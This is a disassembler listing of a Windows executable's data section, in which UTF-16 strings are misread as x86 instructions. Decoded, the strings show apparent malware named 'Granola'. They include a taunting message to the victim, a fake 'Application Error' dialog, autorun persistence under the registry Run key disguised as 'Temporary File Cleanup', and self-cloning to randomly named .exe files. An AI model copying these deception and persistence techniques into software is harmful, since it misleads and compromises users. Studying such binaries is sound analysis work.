   140004b6c:	6f                   	outsl  (%rsi),(%dx)
   140004b6d:	00 74 00 69          	add    %dh,0x69(%rax,%rax,1)
   140004b71:	00 63 00             	add    %ah,0x0(%rbx)
   140004b74:	65 00 20             	add    %ah,%gs:(%rax)
   140004b77:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140004b7b:	00 65 00             	add    %ah,0x0(%rbp)
   140004b7e:	73 00                	jae    0x140004b80
   140004b80:	65 00 20             	add    %ah,%gs:(%rax)
   140004b83:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140004b87:	00 69 00             	add    %ch,0x0(%rcx)
   140004b8a:	6e                   	outsb  (%rsi),(%dx)
   140004b8b:	00 67 00             	add    %ah,0x0(%rdi)
   140004b8e:	73 00                	jae    0x140004b90
   140004b90:	2c 00                	sub    $0x0,%al
   140004b92:	20 00                	and    %al,(%rax)
   140004b94:	61                   	(bad)
   140004b95:	00 6e 00             	add    %ch,0x0(%rsi)
   140004b98:	64 00 20             	add    %ah,%fs:(%rax)
   140004b9b:	00 61 00             	add    %ah,0x0(%rcx)
   140004b9e:	73 00                	jae    0x140004ba0
   140004ba0:	73 00                	jae    0x140004ba2
   140004ba2:	75 00                	jne    0x140004ba4
   140004ba4:	6d                   	insl   (%dx),(%rdi)
   140004ba5:	00 65 00             	add    %ah,0x0(%rbp)
   140004ba8:	64 00 20             	add    %ah,%fs:(%rax)
   140004bab:	00 69 00             	add    %ch,0x0(%rcx)
   140004bae:	74 00                	je     0x140004bb0
   140004bb0:	20 00                	and    %al,(%rax)
   140004bb2:	77 00                	ja     0x140004bb4
   140004bb4:	61                   	(bad)
   140004bb5:	00 73 00             	add    %dh,0x0(%rbx)
   140004bb8:	20 00                	and    %al,(%rax)
   140004bba:	79 00                	jns    0x140004bbc
   140004bbc:	65 00 74 00 20       	add    %dh,%gs:0x20(%rax,%rax,1)
   140004bc1:	00 61 00             	add    %ah,0x0(%rcx)
   140004bc4:	6e                   	outsb  (%rsi),(%dx)
   140004bc5:	00 6f 00             	add    %ch,0x0(%rdi)
   140004bc8:	74 00                	je     0x140004bca
   140004bca:	68 00 65 00 72       	push   $0x72006500
   140004bcf:	00 20                	add    %ah,(%rax)
   140004bd1:	00 66 00             	add    %ah,0x0(%rsi)
   140004bd4:	61                   	(bad)
   140004bd5:	00 75 00             	add    %dh,0x0(%rbp)
   140004bd8:	6c                   	insb   (%dx),(%rdi)
   140004bd9:	00 74 00 79          	add    %dh,0x79(%rax,%rax,1)
   140004bdd:	00 20                	add    %ah,(%rax)
   140004bdf:	00 71 00             	add    %dh,0x0(%rcx)
   140004be2:	75 00                	jne    0x140004be4
   140004be4:	69 00 72 00 6b 00    	imul   $0x6b0072,(%rax),%eax
   140004bea:	20 00                	and    %al,(%rax)
   140004bec:	69 00 6e 00 20 00    	imul   $0x20006e,(%rax),%eax
   140004bf2:	74 00                	je     0x140004bf4
   140004bf4:	68 00 65 00 20       	push   $0x20006500
   140004bf9:	00 57 00             	add    %dl,0x0(%rdi)
   140004bfc:	69 00 6e 00 64 00    	imul   $0x64006e,(%rax),%eax
   140004c02:	6f                   	outsl  (%rsi),(%dx)
   140004c03:	00 77 00             	add    %dh,0x0(%rdi)
   140004c06:	73 00                	jae    0x140004c08
   140004c08:	20 00                	and    %al,(%rax)
   140004c0a:	6f                   	outsl  (%rsi),(%dx)
   140004c0b:	00 70 00             	add    %dh,0x0(%rax)
   140004c0e:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140004c12:	61                   	(bad)
   140004c13:	00 74 00 69          	add    %dh,0x69(%rax,%rax,1)
   140004c17:	00 6e 00             	add    %ch,0x0(%rsi)
   140004c1a:	67 00 20             	add    %ah,(%eax)
   140004c1d:	00 73 00             	add    %dh,0x0(%rbx)
   140004c20:	79 00                	jns    0x140004c22
   140004c22:	73 00                	jae    0x140004c24
   140004c24:	74 00                	je     0x140004c26
   140004c26:	65 00 6d 00          	add    %ch,%gs:0x0(%rbp)
   140004c2a:	2e 00 0a             	cs add %cl,(%rdx)
   140004c2d:	00 0a                	add    %cl,(%rdx)
   140004c2f:	00 55 00             	add    %dl,0x0(%rbp)
   140004c32:	6e                   	outsb  (%rsi),(%dx)
   140004c33:	00 66 00             	add    %ah,0x0(%rsi)
   140004c36:	6f                   	outsl  (%rsi),(%dx)
   140004c37:	00 72 00             	add    %dh,0x0(%rdx)
   140004c3a:	74 00                	je     0x140004c3c
   140004c3c:	75 00                	jne    0x140004c3e
   140004c3e:	6e                   	outsb  (%rsi),(%dx)
   140004c3f:	00 61 00             	add    %ah,0x0(%rcx)
   140004c42:	74 00                	je     0x140004c44
   140004c44:	65 00 6c 00 79       	add    %ch,%gs:0x79(%rax,%rax,1)
   140004c49:	00 20                	add    %ah,(%rax)
   140004c4b:	00 66 00             	add    %ah,0x0(%rsi)
   140004c4e:	6f                   	outsl  (%rsi),(%dx)
   140004c4f:	00 72 00             	add    %dh,0x0(%rdx)
   140004c52:	20 00                	and    %al,(%rax)
   140004c54:	79 00                	jns    0x140004c56
   140004c56:	6f                   	outsl  (%rsi),(%dx)
   140004c57:	00 75 00             	add    %dh,0x0(%rbp)
   140004c5a:	2c 00                	sub    $0x0,%al
   140004c5c:	20 00                	and    %al,(%rax)
   140004c5e:	74 00                	je     0x140004c60
   140004c60:	68 00 69 00 73       	push   $0x73006900
   140004c65:	00 20                	add    %ah,(%rax)
   140004c67:	00 77 00             	add    %dh,0x0(%rdi)
   140004c6a:	61                   	(bad)
   140004c6b:	00 73 00             	add    %dh,0x0(%rbx)
   140004c6e:	20 00                	and    %al,(%rax)
   140004c70:	6e                   	outsb  (%rsi),(%dx)
   140004c71:	00 6f 00             	add    %ch,0x0(%rdi)
   140004c74:	20 00                	and    %al,(%rax)
   140004c76:	71 00                	jno    0x140004c78
   140004c78:	75 00                	jne    0x140004c7a
   140004c7a:	69 00 72 00 6b 00    	imul   $0x6b0072,(%rax),%eax
   140004c80:	2e 00 0a             	cs add %cl,(%rdx)
   140004c83:	00 0a                	add    %cl,(%rdx)
   140004c85:	00 47 00             	add    %al,0x0(%rdi)
   140004c88:	72 00                	jb     0x140004c8a
   140004c8a:	61                   	(bad)
   140004c8b:	00 6e 00             	add    %ch,0x0(%rsi)
   140004c8e:	6f                   	outsl  (%rsi),(%dx)
   140004c8f:	00 6c 00 61          	add    %ch,0x61(%rax,%rax,1)
   140004c93:	00 2c 00             	add    %ch,(%rax,%rax,1)
   140004c96:	20 00                	and    %al,(%rax)
   140004c98:	43 00 6f 00          	rex.XB add %bpl,0x0(%r15)
   140004c9c:	70 00                	jo     0x140004c9e
   140004c9e:	79 00                	jns    0x140004ca0
   140004ca0:	72 00                	jb     0x140004ca2
   140004ca2:	69 00 67 00 68 00    	imul   $0x680067,(%rax),%eax
   140004ca8:	74 00                	je     0x140004caa
   140004caa:	20 00                	and    %al,(%rax)
   140004cac:	32 00                	xor    (%rax),%al
   140004cae:	30 00                	xor    %al,(%rax)
   140004cb0:	32 00                	xor    (%rax),%al
   140004cb2:	34 00                	xor    $0x0,%al
   140004cb4:	2e 00 20             	cs add %ah,(%rax)
   140004cb7:	00 41 00             	add    %al,0x0(%rcx)
   140004cba:	6c                   	insb   (%dx),(%rdi)
   140004cbb:	00 6c 00 20          	add    %ch,0x20(%rax,%rax,1)
   140004cbf:	00 52 00             	add    %dl,0x0(%rdx)
   140004cc2:	69 00 67 00 68 00    	imul   $0x680067,(%rax),%eax
   140004cc8:	74 00                	je     0x140004cca
   140004cca:	73 00                	jae    0x140004ccc
   140004ccc:	20 00                	and    %al,(%rax)
   140004cce:	52                   	push   %rdx
   140004ccf:	00 65 00             	add    %ah,0x0(%rbp)
   140004cd2:	73 00                	jae    0x140004cd4
   140004cd4:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140004cd8:	76 00                	jbe    0x140004cda
   140004cda:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%rax,%rax,1)
   140004cdf:	00 01                	add    %al,(%rcx)
   140004ce1:	11 66 00             	adc    %esp,0x0(%rsi)
   140004ce4:	69 00 72 00 73 00    	imul   $0x730072,(%rax),%eax
   140004cea:	74 00                	je     0x140004cec
   140004cec:	52                   	push   %rdx
   140004ced:	00 75 00             	add    %dh,0x0(%rbp)
   140004cf0:	6e                   	outsb  (%rsi),(%dx)
   140004cf1:	00 00                	add    %al,(%rax)
   140004cf3:	13 46 00             	adc    0x0(%rsi),%eax
   140004cf6:	69 00 72 00 73 00    	imul   $0x730072,(%rax),%eax
   140004cfc:	74 00                	je     0x140004cfe
   140004cfe:	20 00                	and    %al,(%rax)
   140004d00:	52                   	push   %rdx
   140004d01:	00 75 00             	add    %dh,0x0(%rbp)
   140004d04:	6e                   	outsb  (%rsi),(%dx)
   140004d05:	00 00                	add    %al,(%rax)
   140004d07:	4d                   	rex.WRB
   140004d08:	46 00 69 00          	rex.RX add %r13b,0x0(%rcx)
   140004d0c:	72 00                	jb     0x140004d0e
   140004d0e:	73 00                	jae    0x140004d10
   140004d10:	74 00                	je     0x140004d12
   140004d12:	20 00                	and    %al,(%rax)
   140004d14:	72 00                	jb     0x140004d16
   140004d16:	75 00                	jne    0x140004d18
   140004d18:	6e                   	outsb  (%rsi),(%dx)
   140004d19:	00 20                	add    %ah,(%rax)
   140004d1b:	00 64 00 65          	add    %ah,0x65(%rax,%rax,1)
   140004d1f:	00 74 00 65          	add    %dh,0x65(%rax,%rax,1)
   140004d23:	00 63 00             	add    %ah,0x0(%rbx)
   140004d26:	74 00                	je     0x140004d28
   140004d28:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%rax,%rax,1)
   140004d2d:	00 20                	add    %ah,(%rax)
   140004d2f:	00 53 00             	add    %dl,0x0(%rbx)
   140004d32:	65 00 74 00 74       	add    %dh,%gs:0x74(%rax,%rax,1)
   140004d37:	00 69 00             	add    %ch,0x0(%rcx)
   140004d3a:	6e                   	outsb  (%rsi),(%dx)
   140004d3b:	00 67 00             	add    %ah,0x0(%rdi)
   140004d3e:	20 00                	and    %al,(%rax)
   140004d40:	75 00                	jne    0x140004d42
   140004d42:	70 00                	jo     0x140004d44
   140004d44:	20 00                	and    %al,(%rax)
   140004d46:	73 00                	jae    0x140004d48
   140004d48:	68 00 6f 00 70       	push   $0x70006f00
   140004d4d:	00 2e                	add    %ch,(%rsi)
   140004d4f:	00 2e                	add    %ch,(%rsi)
   140004d51:	00 2e                	add    %ch,(%rsi)
   140004d53:	00 00                	add    %al,(%rax)
   140004d55:	81 2f 54 00 68 00    	subl   $0x680054,(%rdi)
   140004d5b:	65 00 20             	add    %ah,%gs:(%rax)
   140004d5e:	00 69 00             	add    %ch,0x0(%rcx)
   140004d61:	6e                   	outsb  (%rsi),(%dx)
   140004d62:	00 73 00             	add    %dh,0x0(%rbx)
   140004d65:	74 00                	je     0x140004d67
   140004d67:	72 00                	jb     0x140004d69
   140004d69:	75 00                	jne    0x140004d6b
   140004d6b:	63 00                	movsxd (%rax),%eax
   140004d6d:	74 00                	je     0x140004d6f
   140004d6f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%rax),%eax
   140004d75:	20 00                	and    %al,(%rax)
   140004d77:	61                   	(bad)
   140004d78:	00 74 00 20          	add    %dh,0x20(%rax,%rax,1)
   140004d7c:	00 30                	add    %dh,(%rax)
   140004d7e:	00 78 00             	add    %bh,0x0(%rax)
   140004d81:	30 00                	xor    %al,(%rax)
   140004d83:	30 00                	xor    %al,(%rax)
   140004d85:	30 00                	xor    %al,(%rax)
   140004d87:	30 00                	xor    %al,(%rax)
   140004d89:	30 00                	xor    %al,(%rax)
   140004d8b:	30 00                	xor    %al,(%rax)
   140004d8d:	30 00                	xor    %al,(%rax)
   140004d8f:	30 00                	xor    %al,(%rax)
   140004d91:	30 00                	xor    %al,(%rax)
   140004d93:	30 00                	xor    %al,(%rax)
   140004d95:	30 00                	xor    %al,(%rax)
   140004d97:	37                   	(bad)
   140004d98:	00 33                	add    %dh,(%rbx)
   140004d9a:	00 39                	add    %bh,(%rcx)
   140004d9c:	00 32                	add    %dh,(%rdx)
   140004d9e:	00 43 00             	add    %al,0x0(%rbx)
   140004da1:	32 00                	xor    (%rax),%al
   140004da3:	46 00 32             	rex.RX add %r14b,(%rdx)
   140004da6:	00 20                	add    %ah,(%rax)
   140004da8:	00 72 00             	add    %dh,0x0(%rdx)
   140004dab:	65 00 66 00          	add    %ah,%gs:0x0(%rsi)
   140004daf:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140004db3:	65 00 6e 00          	add    %ch,%gs:0x0(%rsi)
   140004db7:	63 00                	movsxd (%rax),%eax
   140004db9:	65 00 64 00 20       	add    %ah,%gs:0x20(%rax,%rax,1)
   140004dbe:	00 6d 00             	add    %ch,0x0(%rbp)
   140004dc1:	65 00 6d 00          	add    %ch,%gs:0x0(%rbp)
   140004dc5:	6f                   	outsl  (%rsi),(%dx)
   140004dc6:	00 72 00             	add    %dh,0x0(%rdx)
   140004dc9:	79 00                	jns    0x140004dcb
   140004dcb:	20 00                	and    %al,(%rax)
   140004dcd:	61                   	(bad)
   140004dce:	00 74 00 20          	add    %dh,0x20(%rax,%rax,1)
   140004dd2:	00 30                	add    %dh,(%rax)
   140004dd4:	00 78 00             	add    %bh,0x0(%rax)
   140004dd7:	30 00                	xor    %al,(%rax)
   140004dd9:	30 00                	xor    %al,(%rax)
   140004ddb:	30 00                	xor    %al,(%rax)
   140004ddd:	30 00                	xor    %al,(%rax)
   140004ddf:	30 00                	xor    %al,(%rax)
   140004de1:	30 00                	xor    %al,(%rax)
   140004de3:	30 00                	xor    %al,(%rax)
   140004de5:	30 00                	xor    %al,(%rax)
   140004de7:	30 00                	xor    %al,(%rax)
   140004de9:	30 00                	xor    %al,(%rax)
   140004deb:	30 00                	xor    %al,(%rax)
   140004ded:	30 00                	xor    %al,(%rax)
   140004def:	30 00                	xor    %al,(%rax)
   140004df1:	30 00                	xor    %al,(%rax)
   140004df3:	30 00                	xor    %al,(%rax)
   140004df5:	30 00                	xor    %al,(%rax)
   140004df7:	31 00                	xor    %eax,(%rax)
   140004df9:	34 00                	xor    $0x0,%al
   140004dfb:	2e 00 20             	cs add %ah,(%rax)
   140004dfe:	00 54 00 68          	add    %dl,0x68(%rax,%rax,1)
   140004e02:	00 65 00             	add    %ah,0x0(%rbp)
   140004e05:	20 00                	and    %al,(%rax)
   140004e07:	6d                   	insl   (%dx),(%rdi)
   140004e08:	00 65 00             	add    %ah,0x0(%rbp)
   140004e0b:	6d                   	insl   (%dx),(%rdi)
   140004e0c:	00 6f 00             	add    %ch,0x0(%rdi)
   140004e0f:	72 00                	jb     0x140004e11
   140004e11:	79 00                	jns    0x140004e13
   140004e13:	20 00                	and    %al,(%rax)
   140004e15:	63 00                	movsxd (%rax),%eax
   140004e17:	6f                   	outsl  (%rsi),(%dx)
   140004e18:	00 75 00             	add    %dh,0x0(%rbp)
   140004e1b:	6c                   	insb   (%dx),(%rdi)
   140004e1c:	00 64 00 20          	add    %ah,0x20(%rax,%rax,1)
   140004e20:	00 6e 00             	add    %ch,0x0(%rsi)
   140004e23:	6f                   	outsl  (%rsi),(%dx)
   140004e24:	00 74 00 20          	add    %dh,0x20(%rax,%rax,1)
   140004e28:	00 62 00             	add    %ah,0x0(%rdx)
   140004e2b:	65 00 20             	add    %ah,%gs:(%rax)
   140004e2e:	00 72 00             	add    %dh,0x0(%rdx)
   140004e31:	65 00 61 00          	add    %ah,%gs:0x0(%rcx)
   140004e35:	64 00 2e             	add    %ch,%fs:(%rsi)
   140004e38:	00 0a                	add    %cl,(%rdx)
   140004e3a:	00 0a                	add    %cl,(%rdx)
   140004e3c:	00 43 00             	add    %al,0x0(%rbx)
   140004e3f:	6c                   	insb   (%dx),(%rdi)
   140004e40:	00 69 00             	add    %ch,0x0(%rcx)
   140004e43:	63 00                	movsxd (%rax),%eax
   140004e45:	6b 00 20             	imul   $0x20,(%rax),%eax
   140004e48:	00 6f 00             	add    %ch,0x0(%rdi)
   140004e4b:	6e                   	outsb  (%rsi),(%dx)
   140004e4c:	00 20                	add    %ah,(%rax)
   140004e4e:	00 4f 00             	add    %cl,0x0(%rdi)
   140004e51:	4b 00 20             	rex.WXB add %spl,(%r8)
   140004e54:	00 74 00 6f          	add    %dh,0x6f(%rax,%rax,1)
   140004e58:	00 20                	add    %ah,(%rax)
   140004e5a:	00 74 00 65          	add    %dh,0x65(%rax,%rax,1)
   140004e5e:	00 72 00             	add    %dh,0x0(%rdx)
   140004e61:	6d                   	insl   (%dx),(%rdi)
   140004e62:	00 69 00             	add    %ch,0x0(%rcx)
   140004e65:	6e                   	outsb  (%rsi),(%dx)
   140004e66:	00 61 00             	add    %ah,0x0(%rcx)
   140004e69:	74 00                	je     0x140004e6b
   140004e6b:	65 00 20             	add    %ah,%gs:(%rax)
   140004e6e:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140004e72:	00 65 00             	add    %ah,0x0(%rbp)
   140004e75:	20 00                	and    %al,(%rax)
   140004e77:	70 00                	jo     0x140004e79
   140004e79:	72 00                	jb     0x140004e7b
   140004e7b:	6f                   	outsl  (%rsi),(%dx)
   140004e7c:	00 67 00             	add    %ah,0x0(%rdi)
   140004e7f:	72 00                	jb     0x140004e81
   140004e81:	61                   	(bad)
   140004e82:	00 6d 00             	add    %ch,0x0(%rbp)
   140004e85:	00 29                	add    %ch,(%rcx)
   140004e87:	20 00                	and    %al,(%rax)
   140004e89:	2d 00 20 00 41       	sub    $0x41002000,%eax
   140004e8e:	00 70 00             	add    %dh,0x0(%rax)
   140004e91:	70 00                	jo     0x140004e93
   140004e93:	6c                   	insb   (%dx),(%rdi)
   140004e94:	00 69 00             	add    %ch,0x0(%rcx)
   140004e97:	63 00                	movsxd (%rax),%eax
   140004e99:	61                   	(bad)
   140004e9a:	00 74 00 69          	add    %dh,0x69(%rax,%rax,1)
   140004e9e:	00 6f 00             	add    %ch,0x0(%rdi)
   140004ea1:	6e                   	outsb  (%rsi),(%dx)
   140004ea2:	00 20                	add    %ah,(%rax)
   140004ea4:	00 45 00             	add    %al,0x0(%rbp)
   140004ea7:	72 00                	jb     0x140004ea9
   140004ea9:	72 00                	jb     0x140004eab
   140004eab:	6f                   	outsl  (%rsi),(%dx)
   140004eac:	00 72 00             	add    %dh,0x0(%rdx)
   140004eaf:	01 5b 53             	add    %ebx,0x53(%rbx)
   140004eb2:	00 4f 00             	add    %cl,0x0(%rdi)
   140004eb5:	46 00 54 00 57       	add    %r10b,0x57(%rax,%r8,1)
   140004eba:	00 41 00             	add    %al,0x0(%rcx)
   140004ebd:	52                   	push   %rdx
   140004ebe:	00 45 00             	add    %al,0x0(%rbp)
   140004ec1:	5c                   	pop    %rsp
   140004ec2:	00 4d 00             	add    %cl,0x0(%rbp)
   140004ec5:	69 00 63 00 72 00    	imul   $0x720063,(%rax),%eax
   140004ecb:	6f                   	outsl  (%rsi),(%dx)
   140004ecc:	00 73 00             	add    %dh,0x0(%rbx)
   140004ecf:	6f                   	outsl  (%rsi),(%dx)
   140004ed0:	00 66 00             	add    %ah,0x0(%rsi)
   140004ed3:	74 00                	je     0x140004ed5
   140004ed5:	5c                   	pop    %rsp
   140004ed6:	00 57 00             	add    %dl,0x0(%rdi)
   140004ed9:	69 00 6e 00 64 00    	imul   $0x64006e,(%rax),%eax
   140004edf:	6f                   	outsl  (%rsi),(%dx)
   140004ee0:	00 77 00             	add    %dh,0x0(%rdi)
   140004ee3:	73 00                	jae    0x140004ee5
   140004ee5:	5c                   	pop    %rsp
   140004ee6:	00 43 00             	add    %al,0x0(%rbx)
   140004ee9:	75 00                	jne    0x140004eeb
   140004eeb:	72 00                	jb     0x140004eed
   140004eed:	72 00                	jb     0x140004eef
   140004eef:	65 00 6e 00          	add    %ch,%gs:0x0(%rsi)
   140004ef3:	74 00                	je     0x140004ef5
   140004ef5:	56                   	push   %rsi
   140004ef6:	00 65 00             	add    %ah,0x0(%rbp)
   140004ef9:	72 00                	jb     0x140004efb
   140004efb:	73 00                	jae    0x140004efd
   140004efd:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%rax),%eax
   140004f03:	5c                   	pop    %rsp
   140004f04:	00 52 00             	add    %dl,0x0(%rdx)
   140004f07:	75 00                	jne    0x140004f09
   140004f09:	6e                   	outsb  (%rsi),(%dx)
   140004f0a:	00 00                	add    %al,(%rax)
   140004f0c:	2d 54 00 65 00       	sub    $0x650054,%eax
   140004f11:	6d                   	insl   (%dx),(%rdi)
   140004f12:	00 70 00             	add    %dh,0x0(%rax)
   140004f15:	6f                   	outsl  (%rsi),(%dx)
   140004f16:	00 72 00             	add    %dh,0x0(%rdx)
   140004f19:	61                   	(bad)
   140004f1a:	00 72 00             	add    %dh,0x0(%rdx)
   140004f1d:	79 00                	jns    0x140004f1f
   140004f1f:	20 00                	and    %al,(%rax)
   140004f21:	46 00 69 00          	rex.RX add %r13b,0x0(%rcx)
   140004f25:	6c                   	insb   (%dx),(%rdi)
   140004f26:	00 65 00             	add    %ah,0x0(%rbp)
   140004f29:	20 00                	and    %al,(%rax)
   140004f2b:	43 00 6c 00 65       	add    %bpl,0x65(%r8,%r8,1)
   140004f30:	00 61 00             	add    %ah,0x0(%rcx)
   140004f33:	6e                   	outsb  (%rsi),(%dx)
   140004f34:	00 75 00             	add    %dh,0x0(%rbp)
   140004f37:	70 00                	jo     0x140004f39
   140004f39:	00 1b                	add    %bl,(%rbx)
   140004f3b:	62                   	(bad)
   140004f3c:	00 61 00             	add    %ah,0x0(%rcx)
   140004f3f:	63 00                	movsxd (%rax),%eax
   140004f41:	6b 00 75             	imul   $0x75,(%rax),%eax
   140004f44:	00 70 00             	add    %dh,0x0(%rax)
   140004f47:	52                   	push   %rdx
   140004f48:	00 75 00             	add    %dh,0x0(%rbp)
   140004f4b:	6e                   	outsb  (%rsi),(%dx)
   140004f4c:	00 6e 00             	add    %ch,0x0(%rsi)
   140004f4f:	69 00 6e 00 67 00    	imul   $0x67006e,(%rax),%eax
   140004f55:	00 17                	add    %dl,(%rdi)
   140004f57:	44 00 75 00          	add    %r14b,0x0(%rbp)
   140004f5b:	70 00                	jo     0x140004f5d
   140004f5d:	6c                   	insb   (%dx),(%rdi)
   140004f5e:	00 69 00             	add    %ch,0x0(%rcx)
   140004f61:	63 00                	movsxd (%rax),%eax
   140004f63:	61                   	(bad)
   140004f64:	00 74 00 65          	add    %dh,0x65(%rax,%rax,1)
   140004f68:	00 20                	add    %ah,(%rax)
   140004f6a:	00 31                	add    %dh,(%rcx)
   140004f6c:	00 00                	add    %al,(%rax)
   140004f6e:	41                   	rex.B
   140004f6f:	44 00 75 00          	add    %r14b,0x0(%rbp)
   140004f73:	70 00                	jo     0x140004f75
   140004f75:	6c                   	insb   (%dx),(%rdi)
   140004f76:	00 69 00             	add    %ch,0x0(%rcx)
   140004f79:	63 00                	movsxd (%rax),%eax
   140004f7b:	61                   	(bad)
   140004f7c:	00 74 00 65          	add    %dh,0x65(%rax,%rax,1)
   140004f80:	00 20                	add    %ah,(%rax)
   140004f82:	00 64 00 65          	add    %ah,0x65(%rax,%rax,1)
   140004f86:	00 74 00 65          	add    %dh,0x65(%rax,%rax,1)
   140004f8a:	00 63 00             	add    %ah,0x0(%rbx)
   140004f8d:	74 00                	je     0x140004f8f
   140004f8f:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%rax,%rax,1)
   140004f94:	00 20                	add    %ah,(%rax)
   140004f96:	00 54 00 65          	add    %dl,0x65(%rax,%rax,1)
   140004f9a:	00 72 00             	add    %dh,0x0(%rdx)
   140004f9d:	6d                   	insl   (%dx),(%rdi)
   140004f9e:	00 69 00             	add    %ch,0x0(%rcx)
   140004fa1:	6e                   	outsb  (%rsi),(%dx)
   140004fa2:	00 61 00             	add    %ah,0x0(%rcx)
   140004fa5:	74 00                	je     0x140004fa7
   140004fa7:	69 00 6e 00 67 00    	imul   $0x67006e,(%rax),%eax
   140004fad:	2e 00 00             	cs add %al,(%rax)
   140004fb0:	13 57 00             	adc    0x0(%rdi),%edx
   140004fb3:	68 00 69 00 74       	push   $0x74006900
   140004fb8:	00 65 00             	add    %ah,0x0(%rbp)
   140004fbb:	6c                   	insb   (%dx),(%rdi)
   140004fbc:	00 69 00             	add    %ch,0x0(%rcx)
   140004fbf:	73 00                	jae    0x140004fc1
   140004fc1:	74 00                	je     0x140004fc3
   140004fc3:	00 0f                	add    %cl,(%rdi)
   140004fc5:	41 00 64 00 64       	add    %spl,0x64(%r8,%rax,1)
   140004fca:	00 65 00             	add    %ah,0x0(%rbp)
   140004fcd:	64 00 20             	add    %ah,%fs:(%rax)
   140004fd0:	00 27                	add    %ah,(%rdi)
   140004fd2:	00 01                	add    %al,(%rcx)
   140004fd4:	27                   	(bad)
   140004fd5:	27                   	(bad)
   140004fd6:	00 20                	add    %ah,(%rax)
   140004fd8:	00 74 00 6f          	add    %dh,0x6f(%rax,%rax,1)
   140004fdc:	00 20                	add    %ah,(%rax)
   140004fde:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140004fe2:	00 65 00             	add    %ah,0x0(%rbp)
   140004fe5:	20 00                	and    %al,(%rax)
   140004fe7:	77 00                	ja     0x140004fe9
   140004fe9:	68 00 69 00 74       	push   $0x74006900
   140004fee:	00 65 00             	add    %ah,0x0(%rbp)
   140004ff1:	6c                   	insb   (%dx),(%rdi)
   140004ff2:	00 69 00             	add    %ch,0x0(%rcx)
   140004ff5:	73 00                	jae    0x140004ff7
   140004ff7:	74 00                	je     0x140004ff9
   140004ff9:	2e 00 01             	cs add %al,(%rcx)
   140004ffc:	47 61                	rex.RXB (bad)
   140004ffe:	00 62 00             	add    %ah,0x0(%rdx)
   140005001:	63 00                	movsxd (%rax),%eax
   140005003:	64 00 65 00          	add    %ah,%fs:0x0(%rbp)
   140005007:	66 00 67 00          	data16 add %ah,0x0(%rdi)
   14000500b:	68 00 69 00 6a       	push   $0x6a006900
   140005010:	00 6b 00             	add    %ch,0x0(%rbx)
   140005013:	6c                   	insb   (%dx),(%rdi)
   140005014:	00 6d 00             	add    %ch,0x0(%rbp)
   140005017:	6e                   	outsb  (%rsi),(%dx)
   140005018:	00 6f 00             	add    %ch,0x0(%rdi)
   14000501b:	70 00                	jo     0x14000501d
   14000501d:	71 00                	jno    0x14000501f
   14000501f:	72 00                	jb     0x140005021
   140005021:	73 00                	jae    0x140005023
   140005023:	74 00                	je     0x140005025
   140005025:	75 00                	jne    0x140005027
   140005027:	76 00                	jbe    0x140005029
   140005029:	77 00                	ja     0x14000502b
   14000502b:	78 00                	js     0x14000502d
   14000502d:	79 00                	jns    0x14000502f
   14000502f:	7a 00                	jp     0x140005031
   140005031:	31 00                	xor    %eax,(%rax)
   140005033:	32 00                	xor    (%rax),%al
   140005035:	33 00                	xor    (%rax),%eax
   140005037:	34 00                	xor    $0x0,%al
   140005039:	35 00 36 00 37       	xor    $0x37003600,%eax
   14000503e:	00 38                	add    %bh,(%rax)
   140005040:	00 39                	add    %bh,(%rcx)
   140005042:	00 00                	add    %al,(%rax)
   140005044:	01 00                	add    %eax,(%rax)
   140005046:	09 2e                	or     %ebp,(%rsi)
   140005048:	00 65 00             	add    %ah,0x0(%rbp)
   14000504b:	78 00                	js     0x14000504d
   14000504d:	65 00 00             	add    %al,%gs:(%rax)
   140005050:	1b 43 00             	sbb    0x0(%rbx),%eax
   140005053:	6c                   	insb   (%dx),(%rdi)
   140005054:	00 6f 00             	add    %ch,0x0(%rdi)
   140005057:	6e                   	outsb  (%rsi),(%dx)
   140005058:	00 65 00             	add    %ah,0x0(%rbp)
   14000505b:	20 00                	and    %al,(%rax)
   14000505d:	53                   	push   %rbx
   14000505e:	00 75 00             	add    %dh,0x0(%rbp)
   140005061:	63 00                	movsxd (%rax),%eax
   140005063:	63 00                	movsxd (%rax),%eax
   140005065:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140005069:	73 00                	jae    0x14000506b
   14000506b:	00 4f 53             	add    %cl,0x53(%rdi)
   14000506e:	00 75 00             	add    %dh,0x0(%rbp)
   140005071:	63 00                	movsxd (%rax),%eax
   140005073:	63 00                	movsxd (%rax),%eax
   140005075:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140005079:	73 00                	jae    0x14000507b
   14000507b:	66 00 75 00          	data16 add %dh,0x0(%rbp)
   14000507f:	6c                   	insb   (%dx),(%rdi)
   140005080:	00 6c 00 79          	add    %ch,0x79(%rax,%rax,1)
   140005084:	00 20                	add    %ah,(%rax)
   140005086:	00 63 00             	add    %ah,0x0(%rbx)
   140005089:	72 00                	jb     0x14000508b
   14000508b:	65 00 61 00          	add    %ah,%gs:0x0(%rcx)
   14000508f:	74 00                	je     0x140005091
   140005091:	65 00 64 00 20       	add    %ah,%gs:0x20(%rax,%rax,1)
   140005096:	00 61 00             	add    %ah,0x0(%rcx)
   140005099:	20 00                	and    %al,(%rax)
   14000509b:	63 00                	movsxd (%rax),%eax
   14000509d:	6c                   	insb   (%dx),(%rdi)
   14000509e:	00 6f 00             	add    %ch,0x0(%rdi)
   1400050a1:	6e                   	outsb  (%rsi),(%dx)
   1400050a2:	00 65 00             	add    %ah,0x0(%rbp)
   1400050a5:	20 00                	and    %al,(%rax)
   1400050a7:	66 00 69 00          	data16 add %ch,0x0(%rcx)
   1400050ab:	6c                   	insb   (%dx),(%rdi)
   1400050ac:	00 65 00             	add    %ah,0x0(%rbp)
   1400050af:	20 00                	and    %al,(%rax)
   1400050b1:	66 00 6f 00          	data16 add %ch,0x0(%rdi)
   1400050b5:	72 00                	jb     0x1400050b7
   1400050b7:	20 00                	and    %al,(%rax)
   1400050b9:	27                   	(bad)
